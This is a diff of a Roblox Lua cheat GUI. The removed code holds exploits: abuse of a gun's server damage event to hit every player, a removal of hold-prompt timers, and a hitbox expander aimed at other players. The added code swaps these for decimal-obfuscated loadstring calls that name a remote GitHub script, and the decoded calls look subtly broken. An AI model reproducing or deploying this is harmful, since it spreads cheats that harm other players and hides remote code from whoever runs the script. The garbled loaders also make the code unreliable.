@@ -3,7 +3,7 @@
 
 -- Instances:
 
-local BchHub = Instance.new("ScreenGui")
+local testt = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
 local UIGradient = Instance.new("UIGradient")
@@ -25,12 +25,12 @@ local Title2 = Instance.new("TextLabel")
 
 --Properties:
 
-BchHub.Name = "BchHub"
-BchHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-BchHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+testt.Name = "testt"
+testt.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+testt.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 Main.Name = "Main"
-Main.Parent = BchHub
+Main.Parent = testt
 Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Main.Position = UDim2.new(0.386668146, 0, 0.262626261, 0)
 Main.Size = UDim2.new(0.317318261, 0, 0.474747539, 0)
@@ -181,105 +181,25 @@ Title2.TextWrapped = true
 
 -- Scripts:
 
-local function AHPXV_fake_script() -- RATAOKILLER.LocalScript 
+local function ZUIDOWD_fake_script() -- RATAOKILLER.LocalScript 
 	local script = Instance.new('LocalScript', RATAOKILLER)
 
-	script.Parent.MouseButton1Click:Connect(function()
-	        for i, v in next, game.Players:GetPlayers() do
-	            local A_1 = v.Character.Humanoid
-	            local A_2 = v.Character.Torso
-	            local A_3 = 100
-	            local A_4 = v.Character.Torso.Position
-	            local A_5 = 0
-	            local A_6 = 0
-	            local A_7 = false
-	            local Event = game.Players.LocalPlayer.Backpack["AK-47"]["GunScript_Server"].lnflictTarget
-	            Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)
-	    end
-	end)
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\101\102\102\90\117\99\107\101\98\101\114\103\47\98\114\111\99\104\97\104\117\98\47\109\97\105\110\47\97\49\34\44\116\114\117\101\41\40\41\10")()
 end
-coroutine.wrap(AHPXV_fake_script)()
-local function DNCSXY_fake_script() -- HOLDRAUTIONBYPASS.LocalScript 
+coroutine.wrap(ZUIDOWD_fake_script)()
+local function YYVLINB_fake_script() -- HOLDRAUTIONBYPASS.LocalScript 
 	local script = Instance.new('LocalScript', HOLDRAUTIONBYPASS)
 
-	script.Parent.MouseButton1Click:Connect(function()
-	    for i,v in next, workspace:GetDescendants() do
-	        if v:IsA('ProximityPrompt') and v.HoldDuration then
-	            v.HoldDuration = 0
-	        end
-	    end
-	end)
-	
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\101\102\102\90\117\99\107\101\98\101\114\103\47\98\114\111\99\104\97\104\117\98\47\109\97\105\110\47\97\50\34\44\116\114\117\101\41\10")()
 end
-coroutine.wrap(DNCSXY_fake_script)()
-local function NTUQ_fake_script() -- HITBOXX7.LocalScript 
+coroutine.wrap(YYVLINB_fake_script)()
+local function ASIPLH_fake_script() -- HITBOXX7.LocalScript 
 	local script = Instance.new('LocalScript', HITBOXX7)
 
-	script.Parent.MouseButton1Click:Connect(function()
-	    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "FUCK MYSTRICC", Text = "Aperte T para ativar : Aperta P para desativar"})
-	    local player = game.Players.LocalPlayer
-	    local mouse = player:GetMouse()
-	
-	    -- Settings
-	
-	    bind = "" 
-	    bind2 = "t"
-	    bind3 = "p"
-	
-	    -- Script
-	
-	    mouse.KeyDown:connect(function(key)
-	        if key == bind then
-	            player.Character.HumanoidRootPart.CFrame = CFrame.new(1254.09656, 137.906067, -172.128204)
-	        end
-	    end)
-	
-	    mouse.KeyDown:connect(function(key2)
-	        if key2 == bind2 then
-	            _G.HeadSize = 7
-	            _G.Disabled = true
-	
-	
-	            if _G.Disabled then
-	                for i,v in next, game:GetService('Players'):GetPlayers() do
-	                    if v.Name ~= game:GetService('Players').LocalPlayer.Name then
-	                        pcall(function()
-	                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
-	                            v.Character.HumanoidRootPart.Transparency = 0.7
-	                            v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
-	                            v.Character.HumanoidRootPart.Material = "Neon"
-	                            v.Character.HumanoidRootPart.CanCollide = false
-	                        end)
-	                    end
-	                end
-	            end
-	        end
-	    end)
-	
-	    mouse.KeyDown:connect(function(key3)
-	        if key3 == bind3 then
-	            _G.HeadSize = 7
-	            _G.Disabled = true
-	
-	
-	            for i,v in next, game:GetService('Players'):GetPlayers() do
-	                if v.Name ~= game:GetService('Players').LocalPlayer.Name then
-	                    pcall(function()
-	                        v.Character.HumanoidRootPart.Size = Vector3.new(10, 10, 10)
-	                        v.Character.HumanoidRootPart.Transparency = 1
-	                        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
-	                        v.Character.HumanoidRootPart.Material = "Plastic"
-	                        v.Character.HumanoidRootPart.CanCollide = true
-	                    end)
-	                end
-	            end
-	        end
-	    end)
-	end)
-	
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\101\102\102\90\117\99\107\101\98\101\114\103\47\98\114\111\99\104\97\104\117\98\47\109\97\105\110\47\97\51\34\44\116\114\117\101\41\10")()
 end
-coroutine.wrap(NTUQ_fake_script)()
-local function AHYFAU_fake_script() -- Main.Draggable 
+coroutine.wrap(ASIPLH_fake_script)()
+local function NHUBC_fake_script() -- Main.Draggable 
 	local script = Instance.new('LocalScript', Main)
 
 	local UIS = game:GetService("UserInputService")
@@ -311,4 +231,4 @@ local function AHYFAU_fake_script() -- Main.Draggable
 	    end
 	end)
 end
-coroutine.wrap(AHYFAU_fake_script)()
+coroutine.wrap(NHUBC_fake_script)()
